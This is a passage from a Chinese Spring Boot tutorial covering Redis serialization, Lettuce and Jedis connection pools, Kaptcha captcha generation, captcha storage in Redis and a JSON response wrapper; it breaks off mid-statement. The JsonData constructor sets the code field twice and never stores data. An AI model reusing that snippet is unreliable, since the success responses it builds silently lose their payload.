class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisTemplateConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> redisConnectionFactory</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RedisTemplate&lt;Object, Object&gt; <span class="title">redisTemplate</span><span class="params">(RedisConnectionFactory redisConnectionFactory)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        RedisTemplate&lt;Object, Object&gt; redisTemplate = <span class="keyword">new</span> RedisTemplate&lt;&gt;();</span><br><span class="line">        redisTemplate.setConnectionFactory(redisConnectionFactory);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用Jackson2JsonRedisSerialize 替换默认序列化</span></span><br><span class="line">        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = <span class="keyword">new</span> Jackson2JsonRedisSerializer(Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        objectMapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);</span><br><span class="line">        jackson2JsonRedisSerializer.setObjectMapper(objectMapper);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置key和value的序列化规则</span></span><br><span class="line">        redisTemplate.setKeySerializer(<span class="keyword">new</span> StringRedisSerializer());</span><br><span class="line">        redisTemplate.setValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置hashKey和hashValue的序列化规则</span></span><br><span class="line">        redisTemplate.setHashKeySerializer(<span class="keyword">new</span> StringRedisSerializer());</span><br><span class="line">        redisTemplate.setHashValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置支持事物</span></span><br><span class="line">        <span class="comment">//redisTemplate.setEnableTransactionSupport(true);</span></span><br><span class="line"></span><br><span class="line">        redisTemplate.afterPropertiesSet();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SpringBoot整合Jedis-Lettuce客户端连接池配置实战"><a href="#SpringBoot整合Jedis-Lettuce客户端连接池配置实战" class="headerlink" title="SpringBoot整合Jedis+Lettuce客户端连接池配置实战"></a>SpringBoot整合Jedis+Lettuce客户端连接池配置实战</h2><p>基于SpringDataRedis可以快速替换底层实现</p><ul><li><p>Lettuce连接池介绍(添加连接池)</p><p>引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-pool2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置文件</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 连接池最大连接数（使用负值表示没有限制）</span></span><br><span class="line"><span class="meta">spring.redis.lettuce.pool.max-active</span> = <span class="string">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接池中的最大空闲连接</span></span><br><span class="line"><span class="meta">spring.redis.lettuce.pool.max-idle</span> = <span class="string">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接池中的最小空闲连接</span></span><br><span class="line"><span class="meta">spring.redis.lettuce.pool.min-idle</span> = <span class="string">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接池最大阻塞等待时间（使用负值表示没有限制）</span></span><br><span class="line"><span class="meta">spring.redis.lettuce.pool.max-wait</span>= <span class="string">-1ms</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#指定客户端</span></span><br><span class="line"><span class="meta">spring.redis.client-type</span> = <span class="string">lettuce</span></span><br></pre></td></tr></table></figure><p>Jedis连接池（可以不排除lettuce依赖包）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.lettuce<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lettuce-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--不用指定版本号，本身spring-data-redis里面有--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-pool2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置文件</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 连接池最大连接数（使用负值表示没有限制）</span></span><br><span class="line"><span class="meta">spring.redis.jedis.pool.max-active</span> = <span class="string">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接池中的最大空闲连接</span></span><br><span class="line"><span class="meta">spring.redis.jedis.pool.max-idle</span> = <span class="string">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接池中的最小空闲连接</span></span><br><span class="line"><span class="meta">spring.redis.jedis.pool.min-idle</span> = <span class="string">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接池最大阻塞等待时间（使用负值表示没有限制）</span></span><br><span class="line"><span class="meta">spring.redis.jedis.pool.max-wait</span>= <span class="string">-1ms</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#指定客户端</span></span><br><span class="line"><span class="meta">spring.redis.client-type</span> = <span class="string">jedis</span></span><br></pre></td></tr></table></figure><p>断点调试 redisTemplate的connectionFactory实现</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024183050.png" alt="image-20211024183047968"></p></li></ul><h1 id="分布式缓存实战-String数据结构最佳案例-Jmeter5-x压测"><a href="#分布式缓存实战-String数据结构最佳案例-Jmeter5-x压测" class="headerlink" title="分布式缓存实战-String数据结构最佳案例+Jmeter5.x压测"></a>分布式缓存实战-String数据结构最佳案例+Jmeter5.x压测</h1><h2 id="图形验证码-谷歌开源Kaptcha"><a href="#图形验证码-谷歌开源Kaptcha" class="headerlink" title="图形验证码+谷歌开源Kaptcha"></a>图形验证码+谷歌开源Kaptcha</h2><ul><li><p>如何避免自己的网站成为”肉鸡“或者被刷呢</p><ul><li>增加图形验证码(开发人员)</li><li>单IP请求次数限制(开发人员)</li><li>限制号码发送(一般短信提供商会做)</li><li>攻防永远是有的，只过加大了攻击者的成本，ROI划不 过来自然就放弃了</li></ul></li><li><p>Kaptcha 框架介绍</p><ul><li>谷歌开源的一个可高度配置的实用验证码生成工具<ul><li>验证码的字体/大小/颜色</li><li>验证码内容的范围(数字，字母，中文汉字!)</li><li>验证码图片的大小，边框，边框粗细，边框颜色</li><li>验证码的干扰线 验证码的样式(⻥眼样式、3D、普通模糊)</li></ul></li></ul></li><li><p>添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--kaptcha依赖包--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kaptcha-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>代码配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CaptchaConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 验证码配置</span></span><br><span class="line"><span class="comment">     * Kaptcha配置类名</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Qualifier</span>(<span class="string">"captchaProducer"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> DefaultKaptcha <span class="title">kaptcha</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        DefaultKaptcha kaptcha = <span class="keyword">new</span> DefaultKaptcha();</span><br><span class="line">        Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">        <span class="comment">//验证码个数</span></span><br><span class="line">        properties.setProperty(Constants.KAPTCHA_TEXTPRODUCER_CHAR_LENGTH, <span class="string">"4"</span>);</span><br><span class="line">        <span class="comment">//字体间隔</span></span><br><span class="line">        properties.setProperty(Constants.KAPTCHA_TEXTPRODUCER_CHAR_SPACE,<span class="string">"8"</span>);</span><br><span class="line">        <span class="comment">//干扰线颜色</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//干扰实现类</span></span><br><span class="line">        properties.setProperty(Constants.KAPTCHA_NOISE_IMPL, <span class="string">"com.google.code.kaptcha.impl.NoNoise"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//图片样式</span></span><br><span class="line">        properties.setProperty(Constants.KAPTCHA_OBSCURIFICATOR_IMPL, <span class="string">"com.google.code.kaptcha.impl.WaterRipple"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//文字来源</span></span><br><span class="line">        properties.setProperty(Constants.KAPTCHA_TEXTPRODUCER_CHAR_STRING, <span class="string">"0123456789"</span>);</span><br><span class="line">        Config config = <span class="keyword">new</span> Config(properties);</span><br><span class="line">        kaptcha.setConfig(config);</span><br><span class="line">        <span class="keyword">return</span> kaptcha;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="验证码存储Redis和工具类介绍"><a href="#验证码存储Redis和工具类介绍" class="headerlink" title="验证码存储Redis和工具类介绍"></a>验证码存储Redis和工具类介绍</h2><ul><li>CommonUtil工具类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取ip</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getIpAddr</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        String ipAddress = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ipAddress = request.getHeader(<span class="string">"x-forwarded-for"</span>);</span><br><span class="line">            <span class="keyword">if</span> (ipAddress == <span class="keyword">null</span> || ipAddress.length() == <span class="number">0</span> || <span class="string">"unknown"</span>.equalsIgnoreCase(ipAddress)) &#123;</span><br><span class="line">                ipAddress = request.getHeader(<span class="string">"Proxy-Client-IP"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ipAddress == <span class="keyword">null</span> || ipAddress.length() == <span class="number">0</span> || <span class="string">"unknown"</span>.equalsIgnoreCase(ipAddress)) &#123;</span><br><span class="line">                ipAddress = request.getHeader(<span class="string">"WL-Proxy-Client-IP"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ipAddress == <span class="keyword">null</span> || ipAddress.length() == <span class="number">0</span> || <span class="string">"unknown"</span>.equalsIgnoreCase(ipAddress)) &#123;</span><br><span class="line">                ipAddress = request.getRemoteAddr();</span><br><span class="line">                <span class="keyword">if</span> (ipAddress.equals(<span class="string">"127.0.0.1"</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 根据网卡取本机配置的IP</span></span><br><span class="line">                    InetAddress inet = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        inet = InetAddress.getLocalHost();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    ipAddress = inet.getHostAddress();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 对于通过多个代理的情况，第一个IP为客户端真实IP,多个IP按照','分割</span></span><br><span class="line">            <span class="keyword">if</span> (ipAddress != <span class="keyword">null</span> &amp;&amp; ipAddress.length() &gt; <span class="number">15</span>) &#123;</span><br><span class="line">                <span class="comment">// "***.***.***.***".length()</span></span><br><span class="line">                <span class="comment">// = 15</span></span><br><span class="line">                <span class="keyword">if</span> (ipAddress.indexOf(<span class="string">","</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    ipAddress = ipAddress.substring(<span class="number">0</span>, ipAddress.indexOf(<span class="string">","</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            ipAddress=<span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ipAddress;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">MD5</span><span class="params">(String data)</span>  </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.security.MessageDigest md = MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line">            <span class="keyword">byte</span>[] array = md.digest(data.getBytes(<span class="string">"UTF-8"</span>));</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">byte</span> item : array) &#123;</span><br><span class="line">                sb.append(Integer.toHexString((item &amp; <span class="number">0xFF</span>) | <span class="number">0x100</span>).substring(<span class="number">1</span>, <span class="number">3</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> sb.toString().toUpperCase();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>接口开发</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line">   <span class="keyword">private</span> StringRedisTemplate redisTemplate;</span><br><span class="line">   <span class="meta">@Autowired</span></span><br><span class="line">   <span class="keyword">private</span> Producer captchaProducer;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *临时使用10分钟有效，方便测试</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> CAPTCHA_CODE_EXPIRED = <span class="number">60</span> * <span class="number">1000</span> * <span class="number">10</span>;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 获取图形验证码</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> response</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@GetMapping</span>(<span class="string">"captcha"</span>)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getCaptcha</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span>&#123;</span><br><span class="line">       String captchaText = captchaProducer.createText();</span><br><span class="line">       <span class="comment">//存储</span></span><br><span class="line">   redisTemplate.opsForValue().set(getCaptchaKey(request),captchaText,CAPTCHA_CODE_EXPIRED,TimeUnit.MILLISECONDS);</span><br><span class="line">       BufferedImage bufferedImage = captchaProducer.createImage(captchaText);</span><br><span class="line">       ServletOutputStream outputStream = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           outputStream = response.getOutputStream();</span><br><span class="line">           ImageIO.write(bufferedImage,<span class="string">"jpg"</span>,outputStream);</span><br><span class="line">           outputStream.flush();</span><br><span class="line">           outputStream.close();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 获取缓存的key</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> String <span class="title">getCaptchaKey</span><span class="params">(HttpServletRequest request)</span></span>&#123;</span><br><span class="line">       String ip = CommonUtils.getIpAddr(request);</span><br><span class="line">       String userAgent = request.getHeader(<span class="string">"User-Agent"</span>);</span><br><span class="line">       String key = <span class="string">"user-service:captcha:"</span>+CommonUtils.MD5(ip+userAgent);</span><br><span class="line">       <span class="keyword">return</span> key;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="JsonData工具类封装-验证码校验编码实战"><a href="#JsonData工具类封装-验证码校验编码实战" class="headerlink" title="JsonData工具类封装+验证码校验编码实战"></a>JsonData工具类封装+验证码校验编码实战</h2><ul><li>JsonData响应工具类封装</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JsonData</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 状态码 0 表示成功</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer code;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Object data;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 描述</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">JsonData</span><span class="params">(<span class="keyword">int</span> code,Object data,String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.code = code;</span><br><span class="line">        <span class="keyword">this</span>.msg = msg;</span><br><span class="line">        <span class="keyword">this</span>.code = code;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 成功，不传入数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JsonData <span class="title">buildSuccess</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JsonData(<span class="number">0</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  成功，传入数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JsonData <span class="title">buildSuccess</span><span class="params">(Object data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JsonData(<span class="number">0</span>, data, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 失败，传入描述信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> msg</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JsonData <span class="title">buildError</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JsonData(-<span class="number">1</span>, <span class="keyword">null</span>, msg);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//set get 方法省略</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**校验逻辑</span></span><br><span class="line"><span class="comment">     * 支持手机号、邮箱发送验证码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"send_code"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> JsonData <span class="title">sendRegisterCode</span><span class="params">(@RequestParam(value = <span class="string">"to"</span>, required = <span class="keyword">true</span>)</span>String to,</span></span><br><span class="line"><span class="function">                                 @<span class="title">RequestParam</span><span class="params">(value = <span class="string">"captcha"</span>, required = <span class="keyword">true</span>)</span>String  captcha,</span></span><br><span class="line"><span class="function">                                 HttpServletRequest request)</span>&#123;</span><br><span class="line">    String key = getCaptchaKey(request);</span><br><span class="line">    String cacheCaptcha = redisTemplate.opsForValue().get(key);</span><br><span class="line">    <span class="keyword">if</span>(captcha!=<span class="keyword">null</span> &amp;&amp; 